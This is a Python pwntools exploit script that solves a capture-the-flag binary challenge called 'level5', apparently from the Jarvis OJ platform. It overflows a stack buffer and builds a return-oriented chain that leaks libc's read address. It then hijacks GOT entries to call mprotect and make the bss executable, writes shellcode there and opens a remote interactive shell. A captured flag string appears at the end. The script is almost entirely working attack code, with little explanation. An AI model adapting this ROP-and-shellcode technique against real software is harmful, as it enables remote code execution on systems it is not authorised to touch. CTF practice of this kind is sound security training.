from pwn import *

context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
context.arch = 'amd64'
bin = ELF('./level5')
'''
ssize_t vulnerable_function()
{
  char buf; // [sp+0h] [bp-80h]@1
  write(1, "Input:\n", 7uLL);
  return read(0, &buf, 0x200uLL);
}
'''
def p(n):
	return p64(n)

rr = 1

if rr:
	cn = remote('pwn2.jarvisoj.com', 9884)
	libc = ELF('libc-2.19.so')
else:
	cn = process('./level5')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p_rsi_r15_ret = 0x00000000004006b1
p_rdi_ret = 0x00000000004006b3

cn.recv()#'Input:\n'

pay = 'a'*0x80 + 'bbbbbbbb'
pay += p(p_rsi_r15_ret) + p(bin.got['read']) + p(0)
pay += p(p_rdi_ret) + p(1)
pay += p(bin.plt['write'])#leak got read
pay += p(p_rsi_r15_ret) + p(bin.got['__libc_start_main']) + p(0)
pay += p(p_rdi_ret) + p(0)
pay += p(bin.plt['read'])#hijack __libc_start_main -> mprotect
pay += p(p_rsi_r15_ret) + p(bin.bss()) + p(0)
pay += p(bin.plt['read'])#write shellcode to bss
pay += p(p_rsi_r15_ret) + p(bin.got['__gmon_start__']) + p(0)
pay += p(bin.plt['read'])#hijack __gmon_start__ -> bss_shellcode
pay += p(bin.symbols['main'])

cn.send(pay)
p_read = u64(cn.recv()[:8])
print hex(p_read)
p_mprotect = p_read - libc.symbols['read'] + libc.symbols['mprotect']

cn.send(p(p_mprotect))
sh = asm(shellcraft.amd64.sh())
print len(sh)

cn.send(sh)

cn.send(p(bin.bss()))
############

cn.recv()#'Input:\n'
'''
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
'''
pay = pay = 'a'*0x80 + 'bbbbbbbb'
pay += p(0x00000000004006A6) 
pay += 'bbbbbbbb'
pay += p(0)#rbx
pay += p(1)#rbp
pay += p(bin.got['__libc_start_main'])#r12->addr >> call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be execute
pay += p(7)#r13->rdx
pay += p(0x1000)#r14->rsi
pay += p(0x00600000)#r15->edi
pay += p(0x0000000000400690)

pay += 'bbbbbbbb'
pay += p(0)#rbx
pay += p(1)#rbp
pay += p(bin.got['__gmon_start__'])#r12->addr >> call shellcode
pay += p(0)#r13->rdx
pay += p(0)#r14->rsi
pay += p(0)#r15->edi
pay += p(0x0000000000400690)

#gdb.attach(cn)
#raw_input()
cn.send(pay)
cn.interactive()
#CTF{9c3a234bd804292b153e7a1c25da648c}